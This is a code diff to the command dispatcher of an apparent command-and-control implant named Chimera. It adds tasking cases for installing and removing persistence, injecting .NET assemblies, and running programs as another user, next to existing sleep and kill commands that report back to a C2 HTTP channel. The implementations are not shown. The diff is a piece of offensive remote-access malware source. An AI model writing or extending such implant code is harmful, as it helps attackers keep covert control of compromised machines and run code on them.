@@ -77,6 +77,24 @@ namespace Chimera
                         output = Commands.Sleep.Execute(parameters);
                         break;
 
+                    case "persist":
+                        output = parameters != null && parameters.ToLower() == "remove"
+                            ? Commands.Persist.Remove()
+                            : Commands.Persist.Execute();
+                        break;
+
+                    case "inject_assembly":
+                        output = Commands.InjectAssembly.Execute(parameters);
+                        break;
+
+                    case "runas_exec":
+                        output = Commands.RunasExec.Execute(parameters);
+                        break;
+
+                    case "help":
+                        output = Commands.Help.Execute();
+                        break;
+
                     case "kill":
                         output = Commands.Kill.Execute();
                         C2Http.PostResponse(CallbackUUID, taskID, "Agent terminating.");
